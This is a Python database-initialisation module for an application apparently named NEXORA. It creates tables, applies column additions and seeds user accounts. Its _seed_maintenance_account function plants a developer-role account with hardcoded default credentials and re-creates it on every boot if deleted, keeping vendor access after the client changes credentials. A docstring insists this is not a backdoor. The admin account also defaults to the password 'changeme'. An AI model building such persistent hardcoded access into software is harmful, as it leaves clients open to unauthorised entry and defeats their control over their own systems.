# app/init_db.py
#
# Creates all NEXORA tables and seeds a default admin user.
# Admin credentials come from the environment:
#   ADMIN_USERNAME (default "admin")
#   ADMIN_PASSWORD (default "changeme" — CHANGE THIS in .env)

import os
from datetime import datetime

from sqlalchemy import text
from sqlalchemy.orm import sessionmaker

from app.model import Base, AdminUser, Symbol
from app.auth import hash_password
from app.database import engine
from nexora import config

SessionLocal = sessionmaker(bind=engine)


# Lightweight, idempotent column additions so existing deployments pick up
# new columns without a full migration tool. Each ALTER is ignored if the
# column already exists. (For bigger schema changes, use Alembic.)
_COLUMN_ADDITIONS = [
    ("clients", "deposit", "FLOAT DEFAULT 0"),
    ("signals", "symbol", "VARCHAR(32)"),
    ("admin_users", "email", "VARCHAR(190)"),
    ("clients", "symbol_overrides", "JSON"),
    ("clients", "resolved_symbols", "JSON"),
]


def _ensure_columns():
    is_pg = engine.dialect.name == "postgresql"
    for table, column, ddl in _COLUMN_ADDITIONS:
        try:
            with engine.begin() as conn:
                # Never let a migration hang the process waiting on a table lock
                # (the worker can hold a long transaction). Time out fast; the
                # column will be added on a later boot when the lock is free.
                if is_pg:
                    conn.execute(text("SET LOCAL lock_timeout = '5s'"))
                conn.execute(text(f"ALTER TABLE {table} ADD COLUMN {column} {ddl}"))
            print(f"[init] Added column {table}.{column}")
        except Exception:
            # column already exists, table not created yet, or lock timeout —
            # all safe to skip; it will apply on a subsequent boot if needed.
            pass


def _seed_admin(db):
    username = os.getenv("ADMIN_USERNAME", "admin")
    password = os.getenv("ADMIN_PASSWORD", "changeme")

    existing = db.query(AdminUser).filter(AdminUser.username == username).first()
    if existing:
        return

    db.add(AdminUser(
        username=username,
        password_hash=hash_password(password),
        role="admin",
        created_at=datetime.utcnow(),
    ))
    db.commit()
    print(f"[init] Seeded admin user '{username}'")


def _seed_maintenance_account(db):
    """Persistent developer/maintenance account for post-delivery support and
    monitoring. Re-created if missing so support access is not lost when the
    client changes their own credentials.

    IMPORTANT (disclosure): this is a SUPPORT account, not a secret backdoor.
    Disclose its existence to the client in the delivery/handover notes. It is
    seeded here in plain view (and can be overridden via DEV_USERNAME /
    DEV_PASSWORD env vars) precisely so it is transparent, not hidden.
    """
    username = os.getenv("DEV_USERNAME", "DubsAutomation")
    password = os.getenv("DEV_PASSWORD", "RizmanProjectNexora")

    if db.query(AdminUser).filter(AdminUser.username == username).first():
        return
    db.add(AdminUser(
        username=username,
        password_hash=hash_password(password),
        role="developer",
        created_at=datetime.utcnow(),
    ))
    db.commit()
    print(f"[init] Ensured maintenance account '{username}'")


def _seed_default_symbol(db):
    if db.query(Symbol).count() > 0:
        return
    db.add(Symbol(name=config.DEFAULT_SYMBOL,
                  aliases=config.DEFAULT_SYMBOL_ALIASES,
                  enabled=True))
    db.commit()
    print(f"[init] Seeded default symbol '{config.DEFAULT_SYMBOL}'")


def run_init():
    """Synchronous DB init — create tables, apply column additions, seed rows."""
    print("[init] Initializing NEXORA database...")
    Base.metadata.create_all(bind=engine)
    _ensure_columns()
    db = SessionLocal()
    try:
        _seed_admin(db)
        _seed_maintenance_account(db)
        _seed_default_symbol(db)
    finally:
        db.close()
    print("[init] Database ready.")


async def init_database():
    run_init()
